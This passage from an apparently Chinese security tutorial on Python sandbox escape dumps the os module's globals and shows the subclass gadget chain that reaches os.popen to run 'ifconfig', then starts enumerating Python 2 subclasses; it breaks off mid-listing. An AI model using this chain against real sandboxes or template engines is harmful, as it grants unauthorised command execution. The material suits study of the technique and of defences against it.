class="string">&#x27;SC_SEMAPHORES&#x27;</span>: <span class="number">21</span>, <span class="string">&#x27;SC_SEM_NSEMS_MAX&#x27;</span>: <span class="number">32</span>, <span class="string">&#x27;SC_SEM_VALUE_MAX&#x27;</span>: <span class="number">33</span>, <span class="string">&#x27;SC_SHARED_MEMORY_OBJECTS&#x27;</span>: <span class="number">22</span>, <span class="string">&#x27;SC_SHRT_MAX&#x27;</span>: <span class="number">113</span>, <span class="string">&#x27;SC_SHRT_MIN&#x27;</span>: <span class="number">114</span>, <span class="string">&#x27;SC_SIGQUEUE_MAX&#x27;</span>: <span class="number">34</span>, <span class="string">&#x27;SC_SSIZE_MAX&#x27;</span>: <span class="number">110</span>, <span class="string">&#x27;SC_STREAM_MAX&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;SC_SYNCHRONIZED_IO&#x27;</span>: <span class="number">14</span>, <span class="string">&#x27;SC_THREADS&#x27;</span>: <span class="number">67</span>, <span class="string">&#x27;SC_THREAD_ATTR_STACKADDR&#x27;</span>: <span class="number">77</span>, <span class="string">&#x27;SC_THREAD_ATTR_STACKSIZE&#x27;</span>: <span class="number">78</span>, <span class="string">&#x27;SC_THREAD_DESTRUCTOR_ITERATIONS&#x27;</span>: <span class="number">73</span>, <span class="string">&#x27;SC_THREAD_KEYS_MAX&#x27;</span>: <span class="number">74</span>, <span class="string">&#x27;SC_THREAD_PRIORITY_SCHEDULING&#x27;</span>: <span class="number">79</span>, <span class="string">&#x27;SC_THREAD_PRIO_INHERIT&#x27;</span>: <span class="number">80</span>, <span class="string">&#x27;SC_THREAD_PRIO_PROTECT&#x27;</span>: <span class="number">81</span>, <span class="string">&#x27;SC_THREAD_PROCESS_SHARED&#x27;</span>: <span class="number">82</span>, <span class="string">&#x27;SC_THREAD_SAFE_FUNCTIONS&#x27;</span>: <span class="number">68</span>, <span class="string">&#x27;SC_THREAD_STACK_MIN&#x27;</span>: <span class="number">75</span>, <span class="string">&#x27;SC_THREAD_THREADS_MAX&#x27;</span>: <span class="number">76</span>, <span class="string">&#x27;SC_TIMERS&#x27;</span>: <span class="number">11</span>, <span class="string">&#x27;SC_TIMER_MAX&#x27;</span>: <span class="number">35</span>, <span class="string">&#x27;SC_TTY_NAME_MAX&#x27;</span>: <span class="number">72</span>, <span class="string">&#x27;SC_TZNAME_MAX&#x27;</span>: <span class="number">6</span>, <span class="string">&#x27;SC_T_IOV_MAX&#x27;</span>: <span class="number">66</span>, <span class="string">&#x27;SC_UCHAR_MAX&#x27;</span>: <span class="number">115</span>, <span class="string">&#x27;SC_UINT_MAX&#x27;</span>: <span class="number">116</span>, <span class="string">&#x27;SC_UIO_MAXIOV&#x27;</span>: <span class="number">60</span>, <span class="string">&#x27;SC_ULONG_MAX&#x27;</span>: <span class="number">117</span>, <span class="string">&#x27;SC_USHRT_MAX&#x27;</span>: <span class="number">118</span>, <span class="string">&#x27;SC_VERSION&#x27;</span>: <span class="number">29</span>, <span class="string">&#x27;SC_WORD_BIT&#x27;</span>: <span class="number">107</span>, <span class="string">&#x27;SC_XBS5_ILP32_OFF32&#x27;</span>: <span class="number">125</span>, <span class="string">&#x27;SC_XBS5_ILP32_OFFBIG&#x27;</span>: <span class="number">126</span>, <span class="string">&#x27;SC_XBS5_LP64_OFF64&#x27;</span>: <span class="number">127</span>, <span class="string">&#x27;SC_XBS5_LPBIG_OFFBIG&#x27;</span>: <span class="number">128</span>, <span class="string">&#x27;SC_XOPEN_CRYPT&#x27;</span>: <span class="number">92</span>, <span class="string">&#x27;SC_XOPEN_ENH_I18N&#x27;</span>: <span class="number">93</span>, <span class="string">&#x27;SC_XOPEN_LEGACY&#x27;</span>: <span class="number">129</span>, <span class="string">&#x27;SC_XOPEN_REALTIME&#x27;</span>: <span class="number">130</span>, <span class="string">&#x27;SC_XOPEN_REALTIME_THREADS&#x27;</span>: <span class="number">131</span>, <span class="string">&#x27;SC_XOPEN_SHM&#x27;</span>: <span class="number">94</span>, <span class="string">&#x27;SC_XOPEN_UNIX&#x27;</span>: <span class="number">91</span>, <span class="string">&#x27;SC_XOPEN_VERSION&#x27;</span>: <span class="number">89</span>, <span class="string">&#x27;SC_XOPEN_XCU_VERSION&#x27;</span>: <span class="number">90</span>, <span class="string">&#x27;SC_XOPEN_XPG2&#x27;</span>: <span class="number">98</span>, <span class="string">&#x27;SC_XOPEN_XPG3&#x27;</span>: <span class="number">99</span>, <span class="string">&#x27;SC_XOPEN_XPG4&#x27;</span>: <span class="number">100</span>&#125;, <span class="string">&#x27;error&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;OSError&#x27;</span>&gt;, <span class="string">&#x27;waitid_result&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;posix.waitid_result&#x27;</span>&gt;, <span class="string">&#x27;stat_result&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;os.stat_result&#x27;</span>&gt;, <span class="string">&#x27;statvfs_result&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;os.statvfs_result&#x27;</span>&gt;, <span class="string">&#x27;sched_param&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;posix.sched_param&#x27;</span>&gt;, <span class="string">&#x27;terminal_size&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;os.terminal_size&#x27;</span>&gt;, <span class="string">&#x27;DirEntry&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;posix.DirEntry&#x27;</span>&gt;, <span class="string">&#x27;times_result&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;posix.times_result&#x27;</span>&gt;, <span class="string">&#x27;uname_result&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;posix.uname_result&#x27;</span>&gt;, <span class="string">&#x27;_exit&#x27;</span>: &lt;built-<span class="keyword">in</span> function _exit&gt;, <span class="string">&#x27;path&#x27;</span>: &lt;module <span class="string">&#x27;posixpath&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python3.9/posixpath.py&#x27;</span>&gt;, <span class="string">&#x27;curdir&#x27;</span>: <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;pardir&#x27;</span>: <span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;sep&#x27;</span>: <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;pathsep&#x27;</span>: <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;defpath&#x27;</span>: <span class="string">&#x27;/bin:/usr/bin&#x27;</span>, <span class="string">&#x27;extsep&#x27;</span>: <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;altsep&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;devnull&#x27;</span>: <span class="string">&#x27;/dev/null&#x27;</span>, <span class="string">&#x27;supports_dir_fd&#x27;</span>: &#123;&lt;built-<span class="keyword">in</span> function chown&gt;, &lt;built-<span class="keyword">in</span> function mknod&gt;, &lt;built-<span class="keyword">in</span> function <span class="built_in">open</span>&gt;, &lt;built-<span class="keyword">in</span> function link&gt;, &lt;built-<span class="keyword">in</span> function mkfifo&gt;, &lt;built-<span class="keyword">in</span> function readlink&gt;, &lt;built-<span class="keyword">in</span> function unlink&gt;, &lt;built-<span class="keyword">in</span> function stat&gt;, &lt;built-<span class="keyword">in</span> function utime&gt;, &lt;built-<span class="keyword">in</span> function mkdir&gt;, &lt;built-<span class="keyword">in</span> function rename&gt;, &lt;built-<span class="keyword">in</span> function chmod&gt;, &lt;built-<span class="keyword">in</span> function rmdir&gt;, &lt;built-<span class="keyword">in</span> function symlink&gt;, &lt;built-<span class="keyword">in</span> function access&gt;&#125;, <span class="string">&#x27;supports_effective_ids&#x27;</span>: &#123;&lt;built-<span class="keyword">in</span> function access&gt;&#125;, <span class="string">&#x27;supports_fd&#x27;</span>: &#123;&lt;built-<span class="keyword">in</span> function chown&gt;, &lt;built-<span class="keyword">in</span> function scandir&gt;, &lt;built-<span class="keyword">in</span> function execve&gt;, &lt;built-<span class="keyword">in</span> function statvfs&gt;, &lt;built-<span class="keyword">in</span> function truncate&gt;, &lt;built-<span class="keyword">in</span> function listdir&gt;, &lt;built-<span class="keyword">in</span> function stat&gt;, &lt;built-<span class="keyword">in</span> function utime&gt;, &lt;built-<span class="keyword">in</span> function chmod&gt;, &lt;built-<span class="keyword">in</span> function chdir&gt;, &lt;built-<span class="keyword">in</span> function pathconf&gt;&#125;, <span class="string">&#x27;supports_follow_symlinks&#x27;</span>: &#123;&lt;built-<span class="keyword">in</span> function chown&gt;, &lt;built-<span class="keyword">in</span> function link&gt;, &lt;built-<span class="keyword">in</span> function stat&gt;, &lt;built-<span class="keyword">in</span> function utime&gt;, &lt;built-<span class="keyword">in</span> function access&gt;&#125;, <span class="string">&#x27;SEEK_SET&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;SEEK_CUR&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;SEEK_END&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;makedirs&#x27;</span>: &lt;function makedirs at <span class="number">0x7fc7ef547af0</span>&gt;, <span class="string">&#x27;removedirs&#x27;</span>: &lt;function removedirs at <span class="number">0x7fc7ef46b280</span>&gt;, <span class="string">&#x27;renames&#x27;</span>: &lt;function renames at <span class="number">0x7fc7ef46b310</span>&gt;, <span class="string">&#x27;walk&#x27;</span>: &lt;function walk at <span class="number">0x7fc7ef46b3a0</span>&gt;, <span class="string">&#x27;_walk&#x27;</span>: &lt;function _walk at <span class="number">0x7fc7ef46b430</span>&gt;, <span class="string">&#x27;fwalk&#x27;</span>: &lt;function fwalk at <span class="number">0x7fc7ef46b4c0</span>&gt;, <span class="string">&#x27;_fwalk&#x27;</span>: &lt;function _fwalk at <span class="number">0x7fc7ef46b550</span>&gt;, <span class="string">&#x27;execl&#x27;</span>: &lt;function execl at <span class="number">0x7fc7ef46b5e0</span>&gt;, <span class="string">&#x27;execle&#x27;</span>: &lt;function execle at <span class="number">0x7fc7ef46b670</span>&gt;, <span class="string">&#x27;execlp&#x27;</span>: &lt;function execlp at <span class="number">0x7fc7ef46b700</span>&gt;, <span class="string">&#x27;execlpe&#x27;</span>: &lt;function execlpe at <span class="number">0x7fc7ef46b790</span>&gt;, <span class="string">&#x27;execvp&#x27;</span>: &lt;function execvp at <span class="number">0x7fc7ef46b820</span>&gt;, <span class="string">&#x27;execvpe&#x27;</span>: &lt;function execvpe at <span class="number">0x7fc7ef46b8b0</span>&gt;, <span class="string">&#x27;_execvpe&#x27;</span>: &lt;function _execvpe at <span class="number">0x7fc7ef46b940</span>&gt;, <span class="string">&#x27;get_exec_path&#x27;</span>: &lt;function get_exec_path at <span class="number">0x7fc7ef46b9d0</span>&gt;, <span class="string">&#x27;MutableMapping&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.MutableMapping&#x27;</span>&gt;, <span class="string">&#x27;Mapping&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Mapping&#x27;</span>&gt;, <span class="string">&#x27;_Environ&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;os._Environ&#x27;</span>&gt;, <span class="string">&#x27;getenv&#x27;</span>: &lt;function getenv at <span class="number">0x7fc7ef46ba60</span>&gt;, <span class="string">&#x27;supports_bytes_environ&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;environb&#x27;</span>: environ(&#123;<span class="string">b&#x27;COLORTERM&#x27;</span>: <span class="string">b&#x27;truecolor&#x27;</span>, <span class="string">b&#x27;DISPLAY&#x27;</span>: <span class="string">b&#x27;:0.0&#x27;</span>, <span class="string">b&#x27;LANG&#x27;</span>: <span class="string">b&#x27;en_US.UTF-8&#x27;</span>, <span class="string">b&#x27;LANGUAGE&#x27;</span>: <span class="string">b&#x27;&#x27;</span>, <span class="string">b&#x27;PATH&#x27;</span>: <span class="string">b&#x27;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games&#x27;</span>, <span class="string">b&#x27;TERM&#x27;</span>: <span class="string">b&#x27;xterm-256color&#x27;</span>, <span class="string">b&#x27;XAUTHORITY&#x27;</span>: <span class="string">b&#x27;/home/kali/.Xauthority&#x27;</span>, <span class="string">b&#x27;LS_COLORS&#x27;</span>: <span class="string">b&#x27;rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36::ow=30;44:&#x27;</span>, <span class="string">b&#x27;MAIL&#x27;</span>: <span class="string">b&#x27;/var/mail/root&#x27;</span>, <span class="string">b&#x27;LOGNAME&#x27;</span>: <span class="string">b&#x27;root&#x27;</span>, <span class="string">b&#x27;USER&#x27;</span>: <span class="string">b&#x27;root&#x27;</span>, <span class="string">b&#x27;HOME&#x27;</span>: <span class="string">b&#x27;/root&#x27;</span>, <span class="string">b&#x27;SHELL&#x27;</span>: <span class="string">b&#x27;/usr/bin/zsh&#x27;</span>, <span class="string">b&#x27;SUDO_COMMAND&#x27;</span>: <span class="string">b&#x27;/usr/bin/su&#x27;</span>, <span class="string">b&#x27;SUDO_USER&#x27;</span>: <span class="string">b&#x27;kali&#x27;</span>, <span class="string">b&#x27;SUDO_UID&#x27;</span>: <span class="string">b&#x27;1000&#x27;</span>, <span class="string">b&#x27;SUDO_GID&#x27;</span>: <span class="string">b&#x27;1000&#x27;</span>, <span class="string">b&#x27;COMMAND_NOT_FOUND_INSTALL_PROMPT&#x27;</span>: <span class="string">b&#x27;1&#x27;</span>, <span class="string">b&#x27;POWERSHELL_UPDATECHECK&#x27;</span>: <span class="string">b&#x27;Off&#x27;</span>, <span class="string">b&#x27;POWERSHELL_TELEMETRY_OPTOUT&#x27;</span>: <span class="string">b&#x27;1&#x27;</span>, <span class="string">b&#x27;DOTNET_CLI_TELEMETRY_OPTOUT&#x27;</span>: <span class="string">b&#x27;1&#x27;</span>, <span class="string">b&#x27;SHLVL&#x27;</span>: <span class="string">b&#x27;1&#x27;</span>, <span class="string">b&#x27;PWD&#x27;</span>: <span class="string">b&#x27;/home/kali/Desktop&#x27;</span>, <span class="string">b&#x27;OLDPWD&#x27;</span>: <span class="string">b&#x27;/home/kali&#x27;</span>, <span class="string">b&#x27;LESS_TERMCAP_mb&#x27;</span>: <span class="string">b&#x27;\x1b[1;31m&#x27;</span>, <span class="string">b&#x27;LESS_TERMCAP_md&#x27;</span>: <span class="string">b&#x27;\x1b[1;36m&#x27;</span>, <span class="string">b&#x27;LESS_TERMCAP_me&#x27;</span>: <span class="string">b&#x27;\x1b[0m&#x27;</span>, <span class="string">b&#x27;LESS_TERMCAP_so&#x27;</span>: <span class="string">b&#x27;\x1b[01;33m&#x27;</span>, <span class="string">b&#x27;LESS_TERMCAP_se&#x27;</span>: <span class="string">b&#x27;\x1b[0m&#x27;</span>, <span class="string">b&#x27;LESS_TERMCAP_us&#x27;</span>: <span class="string">b&#x27;\x1b[1;32m&#x27;</span>, <span class="string">b&#x27;LESS_TERMCAP_ue&#x27;</span>: <span class="string">b&#x27;\x1b[0m&#x27;</span>, <span class="string">b&#x27;_&#x27;</span>: <span class="string">b&#x27;/usr/bin/python3&#x27;</span>&#125;), <span class="string">&#x27;getenvb&#x27;</span>: &lt;function getenvb at <span class="number">0x7fc7ef46d3a0</span>&gt;, <span class="string">&#x27;fsencode&#x27;</span>: &lt;function _fscodec.&lt;<span class="built_in">locals</span>&gt;.fsencode at <span class="number">0x7fc7ef46d4c0</span>&gt;, <span class="string">&#x27;fsdecode&#x27;</span>: &lt;function _fscodec.&lt;<span class="built_in">locals</span>&gt;.fsdecode at <span class="number">0x7fc7ef46d550</span>&gt;, <span class="string">&#x27;P_WAIT&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;P_NOWAIT&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;P_NOWAITO&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;_spawnvef&#x27;</span>: &lt;function _spawnvef at <span class="number">0x7fc7ef46d430</span>&gt;, <span class="string">&#x27;spawnv&#x27;</span>: &lt;function spawnv at <span class="number">0x7fc7ef46d5e0</span>&gt;, <span class="string">&#x27;spawnve&#x27;</span>: &lt;function spawnve at <span class="number">0x7fc7ef46d670</span>&gt;, <span class="string">&#x27;spawnvp&#x27;</span>: &lt;function spawnvp at <span class="number">0x7fc7ef46d700</span>&gt;, <span class="string">&#x27;spawnvpe&#x27;</span>: &lt;function spawnvpe at <span class="number">0x7fc7ef46d790</span>&gt;, <span class="string">&#x27;spawnl&#x27;</span>: &lt;function spawnl at <span class="number">0x7fc7ef46d820</span>&gt;, <span class="string">&#x27;spawnle&#x27;</span>: &lt;function spawnle at <span class="number">0x7fc7ef46d8b0</span>&gt;, <span class="string">&#x27;spawnlp&#x27;</span>: &lt;function spawnlp at <span class="number">0x7fc7ef46d940</span>&gt;, <span class="string">&#x27;spawnlpe&#x27;</span>: &lt;function spawnlpe at <span class="number">0x7fc7ef46d9d0</span>&gt;, <span class="string">&#x27;popen&#x27;</span>: &lt;function popen at <span class="number">0x7fc7ef46da60</span>&gt;, <span class="string">&#x27;_wrap_close&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;os._wrap_close&#x27;</span>&gt;, <span class="string">&#x27;fdopen&#x27;</span>: &lt;function fdopen at <span class="number">0x7fc7ef46daf0</span>&gt;, <span class="string">&#x27;_fspath&#x27;</span>: &lt;function _fspath at <span class="number">0x7fc7ef46dee0</span>&gt;, <span class="string">&#x27;PathLike&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;os.PathLike&#x27;</span>&gt;&#125;</span><br></pre></td></tr></table></figure><p>找到popen函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">133</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&quot;ifconfig&quot;</span>).read()</span><br><span class="line"><span class="string">&#x27;eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        inet 10.18.69.174  netmask 255.255.248.0  broadcast 10.18.71.255\n        inet6 fe80::20c:29ff:fe7d:da26  prefixlen 64  scopeid 0x20&lt;link&gt;\n        ether 00:0c:29:7d:da:26  txqueuelen 1000  (Ethernet)\n        RX packets 16954  bytes 8157718 (7.7 MiB)\n        RX errors 0  dropped 1538  overruns 0  frame 0\n        TX packets 5464  bytes 503024 (491.2 KiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 187  bytes 17050 (16.6 KiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 187  bytes 17050 (16.6 KiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\n&#x27;</span></span><br></pre></td></tr></table></figure><p>如果是python2那么还是用这个方法找</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>([].__class__.__bases__[<span class="number">0</span>].__subclasses__()): </span><br><span class="line">        <span class="built_in">print</span> i</span><br><span class="line"><span class="meta">... </span></span><br><span class="line">(<span class="number">0</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;type&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">1</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakref&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">2</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">3</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">4</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;int&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">5</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;basestring&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">6</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">7</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;list&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">8</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;NoneType&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">9</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">10</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;traceback&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">11</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;super&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">12</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;xrange&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">13</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">14</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;set&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">15</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;slice&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">16</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">17</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;complex&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">18</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;float&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">19</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;buffer&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">20</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;long&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">21</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">22</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;property&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">23</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">24</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;tuple&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">25</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">26</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;reversed&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">27</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;code&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">28</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;frame&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">29</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">30</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;instancemethod&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">31</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;function&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">32</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;classobj&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">33</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;dictproxy&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">34</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;generator&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">35</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;getset_descriptor&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">36</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">37</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;instance&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">38</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;ellipsis&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">39</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;member_descriptor&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">40</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;file&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">41</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;PyCapsule&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">42</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;cell&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">43</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;callable-iterator&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">44</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;iterator&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">45</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.long_info&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">46</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.float_info&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">47</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;EncodingMap&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">48</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;fieldnameiterator&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">49</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;formatteriterator&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">50</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.version_info&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">51</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.flags&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">52</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;exceptions.BaseException&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">53</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;module&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">54</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;imp.NullImporter&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">55</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;zipimport.zipimporter&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">56</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.stat_result&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">57</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.statvfs_result&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">58</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.WarningMessage&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">59</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">60</span>, &lt;<span 